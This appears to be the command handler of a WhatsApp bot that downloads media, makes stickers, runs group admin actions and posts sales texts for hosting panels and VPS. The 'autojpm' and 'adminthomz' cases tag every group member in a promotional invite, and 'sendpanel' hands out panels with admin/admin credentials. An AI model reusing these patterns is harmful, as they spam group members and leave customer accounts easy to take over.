if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./all/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'dtiktokmp3':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./all/tiktok').Tiktok(q).then( data => {
haikal.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
		        let { webp2mp4File } = require('./all/uploader')
                reply(mess.wait)
                let media = await haikal.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'remini':
			case 'hd': {
			if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
			if (!quoted) return reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			haikal.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
case 'autojpm': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (autojpm) return reply('Sukses Mengaktifikan Tuan✅')
autojpm.push(from)
fs.writeFileSync('./all/database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning on autojpm in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`JOIN GUYS DI 700 MEMBER MAU GIVE AWAY VPS AND ADMIN PANEL\`\`\`\n\nhhttps://chat.whatsapp.com/FkOc4as2UaXA4pjfS5q6ax`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!autojpm) return reply('Sukses Menonaktifkan Tuan✅')
let off = autojpm.indexOf(from)
autojpm.splice(off, 1)
fs.writeFileSync('./all/database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning off autojpm in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'adminthomz': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Buat Bang Thomz`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (adminthomz) return reply('Sukses Mengaktifikan Tuan✅')
adminthomz.push(from)
fs.writeFileSync('./all/database/adminthomz.json', JSON.stringify(adminthomz))
reply('Success in turning on adminthomz in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`JOIN GUYS DI 700 MEMBER MAU GIVE AWAY VPS AND ADMIN PANEL\`\`\`\n\nhhttps://chat.whatsapp.com/FkOc4as2UaXA4pjfS5q6ax`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!adminthomz) return reply('Sukses Menonaktifkan Tuan✅')
let off = adminthomz.indexOf(from)
adminthomz.splice(off, 1)
fs.writeFileSync('./all/database/adminthomz.json', JSON.stringify(adminthomz))
reply('Success in turning off adminthomz in this group')
} else {
await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'runtime' : {
 if (!isOwner) return reply(mess.only.owner)
 m.reply(` BOT AKTIF SELAMA : ${runtime(process.uptime())} `)}
        break
case 'group':
case 'grup':
if (!isGroup) return reply(mess.OnlyGroup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
haikal.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
haikal.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'tambah':
if (!text) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = text.split('|')[0]
var num_two = text.split('|')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!text) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = text.split('|')[0]
var num_two = text.split('|')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!text) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = text.split('|')[0]
var num_two = text.split('|')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = text.split('|')[0]
var num_two = text.split('|')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'editdesk':{
if (!isOwner) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await reply(text)
await haikal.groupUpdateDescription(from, text).then((owner)).catch((err) => m.reply(jsonformat(err)))
}
break
     case 'delgc':
  if (!isOwner) return m.reply(`khusus Di Group Bang Thomz`)
    if (!isGroup) return m.reply(`Khusus Bang Thomz`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} sukses`)
break
case 'addgc':
    if (!isGroup) return m.reply(`Khusus Group Bang Thomz`)         
if (!isOwner) return m.reply(`khusus Bang Thomz`)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} sukses`)
           break
case 'telegraph': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await reply(mess.wait)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./all/upload')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'toimage': case 'toimg': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await reply(mess.wait)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
        case 'dtiktok':{
if (!isOwner) return m.reply('*khusus Premium*')
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
await reply(mess.wait)
require('./all/tiktok').Tiktok(q).then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await haikal.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case 'setlinkgc': 
if (!isAdmins && !isOwner) return 
await haikal.groupRevokeInvite(from)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
break
case "jadiadmin": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "deletadmin": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case 'setppgc': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await haikal.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await haikal.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Bang Thomz✅*`)
} else {
var memeg = await haikal.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Bang Thomz✅*`)
}
}
break
	case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!quoted) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var medis = await haikal.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await haikal.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Bang Thomz✅*`)
} else {
var memeg = await haikal.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Bang Thomz✅*`)
}
}
break
case 'payment':{
const owned = `${global.ownerNumber}@s.whatsapp.net`
let rsm = `*-------「 PAYMENT BY THOMZ 」 -------*

UNTUK QRIS SILAHKAN SCAN FOTO DI ATAS

DANA : ${nodana}
OVO : ${noovo}
GOPAY : ${nogopay}

*KETIK .proses AGAR PESANAN ANDA LANGSUNG*
*KAMI PROSES*`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/34b0c1061097900bffd29.jpg` }, caption: `${rsm}` }, { quoted: m })
}
break
case 'antilink':{
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./all/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./all/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
haikal.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await haikal.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
    if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await haikal.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
haikal.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
haikal.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "tunda": {
const text12 = `*TRANSAKSI MENGALAMI PENDING*


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

*AKAN KAMI PROSES SEGERA*`
reply(text12)
}
break
case "batal": {
const text12 = `*TRANSAKSI DI BATALKAN*

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹
`
reply(text12)
}
break
case 'setbotname':{
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} Thomz Ganteng`)
    await haikal.updateProfileName(text)
    reply(`Berhasil Mengubah Nama Bot Bang Thomz✅`)
    }
    break
case 'setbiobot':{
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!text) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} Thomz Ganteng`)
    await haikal.updateProfileStatus(text)
    reply(`Berhasil Mengubah Bio Nomor Bot Bang Thomz✅`)
    }
    break
case 'sendpanel': {
		 if (!isOwner) return reply(`Ngapain ? Khusus Bang Thomz!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,webpanel`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
haikal.sendMessage(mq1, {text:`*───❖》Thomz Store Panel《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© Thomz Store Panel*`}, m) 
                 }
            break
   case 'leave': {
if (!isOwner) return reply(`Khusus Bang Thomz`)
                await haikal.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case "reqpanel": {
const text12 = `REQ PANEL BY THOMZ

Ram : 
Username :
Nomor Wa : 
*Garansi 14 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

Mohon Di Isi Dengan Benar`
reply(text12)
}
break
case 'block':{
if (!isOwner) return (`Ngapain ? Khusus Bang Thomz`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await haikal.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Bang Thomz✅')
}
break
case 'unblock':{
if (!isOwner) return (`Ngapain ? Khusus Bang Thomz`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await haikal.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
reply('Sukses Unblock Bang Thomz✅')
}
break
case "mc":{
if (!text) return reply("salah contoh .mc 250k byy thomz")
let cret = await haikal.groupCreate(text, [])
let response = await haikal.groupInviteCode(cret.id)
let teks = `「 *Create Group Mc By THOMZ* 」

GRUP MC SUDAH DI BUAT ATAS NAMA *${text} SILAHKAN MASUK MELALUI LINK YANG ADA DI BAWAH YAH GENGS

*⥁* Name : ${cret.subject}
*⥁* MC BY : ${botname}
*⥁* Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
*⥁* Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
haikal.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
haikal.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case "owner": {
const repf = await haikal.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
haikal.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Ini Owner Ku Kak Kalo Mau Buy Panel Ke Dia Aja`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "public": {
if (!isOwner) return reply("mess.only.owner")
haikal.public = true
reply("mess.success")
}
break
case "self": {
if (!isOwner) return reply(mess.only.owner)
haikal.public = false
reply(mess.success)
}
break
case "sc" :
case "script": {
const text12 = `UNTUK SCRIPT BISA LANGSUNG TANYA KE THOMZ AJA KAK INI NOMORNYA 08388072690 BTW DIA JUALAN PANEL JUGA`
reply(text12)
}
break
case "yt": {
const text12 = `Nih Link Yt Ku Kak

https://www.youtube.com/@thomvelz1720`
reply(text12)
}
break
           case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI BERHASIL BY THOMZ ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* Rp${nominal}_
 _• *Nama Store:* ${botname}_

*TERIMA KASIH TELAH ORDER DI ${global.botname}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YAH BANG*')
haikal.sendMessage(owner + "@s.whatsapp.net", { text: "BANG THOMZ ADA YANG MESEN NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo:{ forwardingScore: 9999, isForwarded: true }})
}
break
case "formatneed": {
const text12 = `*FORMAT JASA NEED AKUN BY ${botname}*
*( BUKAN AKUN ADMIN )*

NAMA PEMILIK : 
AKUN :
LOGIN :
HARGA : 
SPEK AKUN :  
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN ${botname} UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "formatpost": {
const text12 = `🥀FORMAT JASPOST BY ${botname}🥀
(BUKAN AKUN MILIK ADMIN)
                   
JUAL AKUN :
SPEK :
HARGA:
NOMER : wa.me/


NOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN ${botname} AGAR TERHINDAR DARI PENIPUAN


🥀BEE SMART BUYER🥀`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "feerekber": {
const text12 = `FEE BER² ${botname}
•0 - 20K ≠ 5K
•21K - 150K ≠ 10K
•151K - 200K ≠ 15K
•201K - 324K ≠ 20K
•325K - 400K ≠ 25K
•401K - 500K ≠ 30K
•501K - 599K ≠ 35K
•600K - 699K ≠ 40K
•700K - 799K ≠ 45K
•800K - 1JT ≠ 50K
•1,1JT - 1,7JT ≠ 70K
•1,8JT - 2,5JT ≠ 100K
•BTBER ≠ 50K 
•TTBEB ≠ 50K`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "listpanel": {
const text12 = `SEWA PANEL THOMVELZ

➠ PANEL PROMO FRESH PROMO

╭━「 PAKET SILVER 」
│⛁ RAM 1GB | CPU 30%
╰━━━☉ HARGA : 3k

╭━「 PAKET SILVER 」
│⛁ RAM 2GB | CPU 50%
╰━━━☉ HARGA : 5k

╭━「 PAKET GOLD 」
│⛁ RAM 3GB | CPU 70%
╰━━━☉ HARGA : 7K

╭━「 PLATINUM (HOT) 」
│⛁ RAM 4GB | CPU 90%
╰━━━☉ HARGA : 9K

╭━「 EXECUTIVE 」
│⛁ RAM 5GB | CPU 100%
╰━━━☉ HARGA : 10K

╭━「 ULTIMATE (HOT) 」
│⛁ RAM 7GB | CPU 130%
╰━━━☉ HARGA : 12K

╭━「 SUPER ULTIMATE 」
│⛁ RAM UNLI | CPU UNLI%
╰━━━☉ HARGA : 15K

*Reqwest ram dan cpu chat langsung

Keuntungan sewa panel di kami?
➠ Server terjaga 
➠ Jual kualitas bukan asal jual
➠ Hemat kuota 
➠ Hemat penyimpanan
➠ Web close? bot tetep on!

*Harga diatas adalah untuk 1bulan

MINAT CHAT : 
https://wa.me/6283169231840`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "listvps": {
const text12 = `OPEN VPS NYA JUGA BUAT SERVER SENDIRI
READY PROMO VPS NYA KAK ‼️

LIST :
📮 VPS RAM 16GB 8 CORE : 100K
📮 VPS RAM 8GB 4 CORE : 55K
📮 VPS RAM 4GB 2 CORE : 45K
📮 VPS RAM 2GB 1 CORE : 35K
📮 VPS RAM 1GB 1 CORE : 25K

KEUNTUNGAN :
BUY VPS RAM 4 & 8 FREE SC TEMA
FREE INSTAL PANEL
NEGO KE PM AJA ASAL MENGOTAK
 FREE SC CRETAE PANEL BUY VPS RAM 4 & 8`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "produklain": {
const text12 = `💎MENYEDIAKAN

• OPEN OWNER = 35k
• JASA EDIT SCRIPT PANEL = TERGANTUNG
• JASA TAMBAH FITUR SCRIPT = TERGANTUNG
• JASA FIX SCRIPT EROR = TERGANTUNG
• JASA BUAT SC PRIBADI = TERGANTUNG
• JASA INSTALL PANEL PTERIDACTYL = 10K
• JASA INSTALL THEME = 10K BISA NEGO
• READY Panel RUN BOT ON 24 JAM = KEITK .listpanel
• READY VPS = KETIK .listvps
• READY ADMIN PANEL = 15K
• READY RESELLER PANEL = 10K
• READY SC NO ENC 100% = TANYA AJA 
• READY SC CPANEL BY THOMZ = 15-20K
• READY SC PUSHKONTAK X STORE BY THOMZ = 10K
• DLL TANYA AJA KALO ADA YANG DI BUTUHIN`
